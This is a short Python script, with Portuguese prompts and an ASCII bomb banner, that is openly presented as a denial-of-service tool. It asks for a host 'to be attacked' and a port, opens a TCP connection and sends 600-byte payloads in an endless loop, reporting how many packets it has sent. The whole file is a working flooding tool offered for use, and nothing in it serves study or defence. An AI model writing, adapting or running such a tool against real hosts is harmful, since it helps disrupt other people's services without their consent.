import socket
import sys

explosivo = """
                  (\__.-. |
                  == ===_]+
                          |
 ` - .               -
       ` - >->         ´ - >->
"""
def motor_DoS(host, porta):
    payload = b"$" * 600
    nbytes = sys.getsizeof(payload)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        sock.connect((host, porta))
        i = 1
        while True:
            try:
                sock.send(payload)
                if i % 1000 == 0:
                    print(f"Tamanho do payload em bytes: {nbytes}")
                    print(f"[{i}] Pacotes enviados")
                i += 1
            except KeyboardInterrupt:
                print("\nFerramenta fechada")
    except ConnectionRefusedError:
        print("Conexão recusada. Verifique se o servidor está online.")
    except Exception as e:
        print(f"Ocorreu um erro durante o envio: {e}")
    finally:
        sock.close()

def main():
    try:
        print(explosivo)
        host = input("Digite o host a ser atacado: ")
        porta = int(input("Digite a porta: "))
        print(f"Alvo: {host}")
        print(f"Porta: {porta}")
        motor_DoS(host, porta)
    except KeyboardInterrupt:
        print("\nFerramenta fechada")
if __name__ == "__main__":
    main()
